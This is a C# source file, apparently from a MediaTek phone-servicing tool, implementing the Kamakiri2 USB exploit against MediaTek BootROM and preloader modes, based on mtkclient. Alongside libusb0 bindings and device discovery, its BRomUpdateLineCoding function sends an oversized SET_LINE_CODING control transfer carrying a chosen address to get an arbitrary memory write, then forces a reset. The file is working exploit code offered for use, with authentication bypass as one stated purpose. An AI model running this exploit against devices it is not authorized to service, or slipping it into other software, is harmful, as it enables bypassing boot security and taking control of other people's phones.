// ============================================================================
// LoveAlways - MediaTek USB Exploit (Kamakiri2)
// Based on mtkclient by B.Kerler (GPLv3) and MTKAuthBypassQT
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation & some fixes by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using System;
using System.Runtime.InteropServices;

namespace LoveAlways.MediaTek.Exploit
{
    /// <summary>
    /// MTK USB Exploit Handler - Use libusb0 for USB control transfers
    /// Implementation of Kamakiri2 exploit
    /// </summary>
    public class MtkUsbExploit : IDisposable
    {
        private IntPtr _deviceHandle = IntPtr.Zero;
        private bool _disposed;
        private readonly Action<string> _log;

        public bool IsConnected => _deviceHandle != IntPtr.Zero;

        private const int MTK_VID = 0x0E8D;
        private const int MTK_PID_BROM = 0x0003;
        private const int MTK_PID_PRELOADER = 0x2000;

        #region libusb0 P/Invoke

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern void usb_init();

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_find_busses();

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_find_devices();

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr usb_get_busses();

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr usb_open(IntPtr dev);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_close(IntPtr dev);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_control_msg(IntPtr dev, int requesttype, int request,
            int value, int index, byte[] bytes, int size, int timeout);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_release_interface(IntPtr dev, int ifc_num);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_resetep(IntPtr dev, int ep);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_reset(IntPtr dev);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_claim_interface(IntPtr dev, int ifc_num);

        [DllImport("libusb0.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int usb_set_configuration(IntPtr dev, int configuration);

        [StructLayout(LayoutKind.Sequential)]
        private struct usb_device_descriptor
        {
            public byte bLength;
            public byte bDescriptorType;
            public ushort bcdUSB;
            public byte bDeviceClass;
            public byte bDeviceSubClass;
            public byte bDeviceProtocol;
            public byte bMaxPacketSize0;
            public ushort idVendor;
            public ushort idProduct;
            public ushort bcdDevice;
            public byte iManufacturer;
            public byte iProduct;
            public byte iSerialNumber;
            public byte bNumConfigurations;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct usb_device
        {
            public IntPtr next;
            public IntPtr prev;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
            public string filename;
            public IntPtr bus;
            public usb_device_descriptor descriptor;
            public IntPtr config;
            public IntPtr dev;
            public byte devnum;
            public byte num_children;
            public IntPtr children;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct usb_bus
        {
            public IntPtr next;
            public IntPtr prev;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
            public string dirname;
            public IntPtr devices;
            public uint location;
            public IntPtr root_dev;
        }

        #endregion

        public MtkUsbExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
        }

        /// <summary>
        /// Connect to MTK USB device
        /// </summary>
        public bool Connect()
        {
            try
            {
                usb_init();
                usb_find_busses();
                usb_find_devices();

                IntPtr busPtr = usb_get_busses();
                while (busPtr != IntPtr.Zero)
                {
                    var bus = Marshal.PtrToStructure<usb_bus>(busPtr);
                    IntPtr devPtr = bus.devices;

                    while (devPtr != IntPtr.Zero)
                    {
                        var dev = Marshal.PtrToStructure<usb_device>(devPtr);

                        if (dev.descriptor.idVendor == MTK_VID &&
                            (dev.descriptor.idProduct == MTK_PID_BROM ||
                             dev.descriptor.idProduct == MTK_PID_PRELOADER))
                        {
                            _deviceHandle = usb_open(devPtr);
                            if (_deviceHandle != IntPtr.Zero)
                            {
                                _log($"[USB] Connected MTK device: VID=0x{dev.descriptor.idVendor:X4}, PID=0x{dev.descriptor.idProduct:X4}");
                                return true;
                            }
                        }

                        devPtr = dev.next;
                    }

                    busPtr = bus.next;
                }

                _log("[USB] MTK USB device not found");
                return false;
            }
            catch (DllNotFoundException)
            {
                _log("[USB] Error: libusb0.dll not found - Please install libusb-win32 driver");
                return false;
            }
            catch (Exception ex)
            {
                _log($"[USB] Connection failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// USB Control Transfer
        /// </summary>
        private bool UsbSendDevCtrl(byte reqType, byte req, ushort val, ushort idx, byte[] buff)
        {
            if (_deviceHandle == IntPtr.Zero) return false;

            try
            {
                int ret = usb_control_msg(_deviceHandle, reqType, req, val, idx, buff, buff.Length, 1000);

                if (ret != 0 && ret != buff.Length && ret != buff.Length + 8)
                {
                    if (ret < 0) return true;  // Some errors can be ignored
                    return false;
                }

                usb_release_interface(_deviceHandle, 0);
                usb_resetep(_deviceHandle, 0);

                return true;
            }
            catch (Exception ex)
            {
                _log($"[USB] UsbSendDevCtrl Exception: {ex.Message}");
                return true;  // Ignore exception and continue
            }
        }

        /// <summary>
        /// BRomUpdateLineCoding - Core function to trigger Kamakiri2 vulnerability
        /// Arbitrary address write via USB CDC SET_LINE_CODING control transfer
        /// </summary>
        public bool BRomUpdateLineCoding(uint addr)
        {
            if (_deviceHandle == IntPtr.Zero) return false;

            try
            {
                // 1. GET_LINE_CODING (Get current line coding)
                var getLineCode = new byte[7];
                if (!UsbSendDevCtrl(0xA1, 0x21, 0x00, 0x00, getLineCode))
                {
                    _log("[USB] GET_LINE_CODING failed");
                    return false;
                }

                // 2. SET_LINE_CODING (Set new line coding + address)
                // Use buffer overflow to write address
                var setLineCode = new byte[13];
                Array.Copy(getLineCode, 0, setLineCode, 0, 7);
                setLineCode[7] = 0x00;
                // Little-Endian address write
                setLineCode[8] = (byte)(addr & 0xFF);
                setLineCode[9] = (byte)((addr >> 8) & 0xFF);
                setLineCode[10] = (byte)((addr >> 16) & 0xFF);
                setLineCode[11] = (byte)((addr >> 24) & 0xFF);
                setLineCode[12] = 0x00;

                if (!UsbSendDevCtrl(0x21, 0x20, 0x00, 0x00, setLineCode))
                {
                    _log("[USB] SET_LINE_CODING failed");
                    return false;
                }

                // 3. Trigger reset
                var reset = new byte[7];
                UsbSendDevCtrl(0x80, 0x06, 0x0200, 0x00, reset);

                return true;
            }
            catch (Exception ex)
            {
                _log($"[USB] BRomUpdateLineCoding Exception: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Check if MTK USB device is available
        /// </summary>
        public static bool IsDeviceAvailable()
        {
            try
            {
                usb_init();
                usb_find_busses();
                usb_find_devices();

                IntPtr busPtr = usb_get_busses();
                while (busPtr != IntPtr.Zero)
                {
                    var bus = Marshal.PtrToStructure<usb_bus>(busPtr);
                    IntPtr devPtr = bus.devices;

                    while (devPtr != IntPtr.Zero)
                    {
                        var dev = Marshal.PtrToStructure<usb_device>(devPtr);

                        if (dev.descriptor.idVendor == MTK_VID &&
                            (dev.descriptor.idProduct == MTK_PID_BROM ||
                             dev.descriptor.idProduct == MTK_PID_PRELOADER))
                            return true;

                        devPtr = dev.next;
                    }

                    busPtr = bus.next;
                }

                return false;
            }
            catch { return false; }
        }

        /// <summary>
        /// Reset USB device
        /// </summary>
        public bool Reset()
        {
            if (_deviceHandle == IntPtr.Zero) return false;

            try
            {
                int ret = usb_reset(_deviceHandle);
                _log($"[USB] Reset result: {ret}");
                return ret >= 0;
            }
            catch (Exception ex)
            {
                _log($"[USB] Reset failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Close USB connection
        /// </summary>
        public void Close(bool reset = false)
        {
            if (_deviceHandle == IntPtr.Zero) return;

            try
            {
                if (reset)
                {
                    usb_reset(_deviceHandle);
                }
                usb_close(_deviceHandle);
            }
            catch { }
            finally
            {
                _deviceHandle = IntPtr.Zero;
            }
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            Close();
            GC.SuppressFinalize(this);
        }

        ~MtkUsbExploit()
        {
            Dispose();
        }
    }
}
